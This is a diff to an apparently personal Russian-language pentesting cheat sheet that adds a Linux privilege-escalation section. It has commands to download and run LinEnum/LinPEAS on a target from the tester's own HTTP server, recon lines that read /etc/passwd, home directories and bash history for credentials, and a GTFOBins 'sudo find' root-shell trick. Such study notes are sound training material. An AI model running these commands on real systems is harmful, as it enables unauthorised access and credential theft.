@@ -172,3 +172,54 @@ curl -I https://<host>/            # только заголовки (fingerprin
 - работать в ~ (домашней папке), не в / (нет прав)
 - chmod 600 для id_rsa (SSH требует, иначе "permissions too open")
 - pip блокируется (externally-managed) → pipx install ИЛИ --break-system-packages
+
+## Privilege Escalation (Linux)
+
+### Автоматический enumeration — скрипты
+Собирают все векторы privesc разом (sudo, SUID, cron, слабые права, ядро).
+
+**LinEnum** (github.com/rebootuser/LinEnum):
+```bash
+# на СВОЕЙ машине: поднять http-сервер в папке со скриптом
+python3 -m http.server 8000
+
+# на ЦЕЛИ: скачать и запустить
+wget http://<твой_IP>:8000/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+./LinEnum.sh -t          # -t = thorough (углублённая проверка)
+```
+
+**LinPEAS** (аналог, мощнее, с подсветкой находок):
+```bash
+wget http://<твой_IP>:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+Оба выдают отчёт: sudo-права, SUID, cron, читаемые файлы, версия ядра, capabilities.
+LinPEAS подсвечивает "интересное" цветом; LinEnum проще/чище. Держать оба.
+
+### Ручной privesc-recon (базовые команды)
+```bash
+whoami; id                              # кто я, в каких группах
+sudo -l                                 # что могу от root (→ GTFOBins)
+find / -perm -4000 -type f 2>/dev/null  # SUID-бинарники (права владельца)
+find / -perm -2000 -type f 2>/dev/null  # SGID
+getcap -r / 2>/dev/null                 # capabilities
+cat /etc/crontab; ls -la /etc/cron.*    # cron-задачи (изменяемый root-скрипт?)
+uname -a                                # версия ядра (→ kernel exploit)
+cat /etc/passwd                         # пользователи (+ writable?)
+ls -la /home/*                          # чужие домашние папки, ключи
+history; cat ~/.bash_history            # история команд (пароли?)
+```
+
+### GTFOBins — ключевой ресурс
+`gtfobins.github.io` — база «как из разрешённой sudo-команды / SUID-бинарника
+получить shell». Нашёл в `sudo -l` или SUID необычную команду → ищешь её на GTFOBins.
+
+```bash
+# пример: sudo -l показал (root) NOPASSWD: /usr/bin/find
+# на GTFOBins для find:
+sudo find . -exec /bin/sh \; -quit    # → root shell
+```
